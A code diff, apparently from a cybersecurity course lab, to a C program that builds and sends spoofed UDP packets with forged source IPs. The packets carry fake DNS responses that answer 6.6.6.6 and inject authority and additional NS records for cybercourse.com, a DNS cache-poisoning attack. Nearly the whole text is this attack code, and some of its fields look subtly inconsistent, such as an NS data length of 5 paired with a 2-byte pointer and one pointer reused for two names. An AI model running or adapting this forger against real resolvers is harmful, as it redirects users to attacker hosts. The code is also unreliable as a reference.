@@ -99,7 +99,7 @@ void send_custom_ip_packet(const char *src_ip, const char *dest_ip, int src_port
     psh.reserved = 0;
     psh.protocol = IPPROTO_UDP;
     psh.udp_length = htons(sizeof(struct udphdr) + dns_payload_size);
-
+    printf("udp length is :%d\n", sizeof(struct udphdr) + dns_payload_size);
     char pseudo_packet[BUFFER_SIZE];
     memcpy(pseudo_packet, &psh, sizeof(psh));
     memcpy(pseudo_packet + sizeof(psh), udph, sizeof(struct udphdr) + dns_payload_size);
@@ -169,11 +169,10 @@ void encode_domain_name(uint8_t *dns, const char *host) {
     *dns++ = '\0'; // Null terminator
 }
 
-// Function to build the DNS response payload
 int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid) {
     uint8_t *ptr = buffer;
 
-    // DNS Header
+    // DNS Header (12 bytes)
     *(uint16_t *)ptr = htons(txid); // Transaction ID
     ptr += 2;
     *(uint16_t *)ptr = htons(0x8410); // Standard query response, No error, RA=1
@@ -195,23 +194,23 @@ int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid) {
     *(uint16_t *)ptr = htons(1);  // Class IN
     ptr += 2;
 
-    // DNS Answer Section
+    // DNS Answer Section (Returns `6.6.6.6`)
     *(uint16_t *)ptr = htons(0xc00c); // Pointer to query name
     ptr += 2;
     *(uint16_t *)ptr = htons(1);      // Type A
     ptr += 2;
     *(uint16_t *)ptr = htons(1);      // Class IN
     ptr += 2;
-    *(uint32_t *)ptr = htonl(600);    // TTL
+    *(uint32_t *)ptr = htonl(600);    // TTL (10 minutes)
     ptr += 4;
-    *(uint16_t *)ptr = htons(4);      // Data length
+    *(uint16_t *)ptr = htons(4);      // Data length (IPv4)
     ptr += 2;
-    *(uint32_t *)ptr = inet_addr("6.6.6.6"); // IP for www.example.cybercourse.com
+    *(uint32_t *)ptr = inet_addr("6.6.6.6"); // Spoofed IP `6.6.6.6`
     ptr += 4;
 
-    // Authority Section (NS Record)
-    encode_domain_name(ptr, "cybercourse.com");
-    ptr += strlen((const char *)ptr) + 1;
+    // Authority Section (NS Record for cybercourse.com)
+    *(uint16_t *)ptr = htons(0xc018); // Pointer to "cybercourse.com"
+    ptr += 2;
     *(uint16_t *)ptr = htons(2);  // Type NS
     ptr += 2;
     *(uint16_t *)ptr = htons(1);  // Class IN
@@ -220,12 +219,12 @@ int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid) {
     ptr += 4;
     *(uint16_t *)ptr = htons(5);  // Data length
     ptr += 2;
-    encode_domain_name(ptr, "ns.cybercourse.com");
-    ptr += strlen((const char *)ptr) + 1;
+    *(uint16_t *)ptr = htons(0xc018); // Pointer to NS name (cybercourse)
+    ptr += 2;
 
     // Additional Section (A Record for NS)
-    encode_domain_name(ptr, "ns.cybercourse.com");
-    ptr += strlen((const char *)ptr) + 1;
+    *(uint16_t *)ptr = htons(0xc049); // Pointer to "ns.cybercourse.com"
+    ptr += 2;
     *(uint16_t *)ptr = htons(1);  // Type A
     ptr += 2;
     *(uint16_t *)ptr = htons(1);  // Class IN
